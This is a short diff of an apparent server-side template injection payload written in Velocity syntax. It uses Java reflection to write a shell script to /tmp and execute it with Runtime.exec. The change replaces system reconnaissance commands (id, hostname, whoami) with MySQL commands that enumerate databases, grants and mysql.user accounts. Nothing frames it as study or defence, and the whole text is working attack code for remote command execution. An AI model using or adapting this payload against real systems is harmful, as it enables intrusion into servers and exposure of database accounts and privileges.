@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("id; hostname; uname -r; whoami")
+$fw.write("echo ===DBS===; mysql -e 'show databases' 2>&1 | head -60; echo ===GRANTS===; mysql -e 'show grants' 2>&1 | head -20; echo ===VER===; mysql -e 'select user,host from mysql.user' 2>&1 | head -40")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
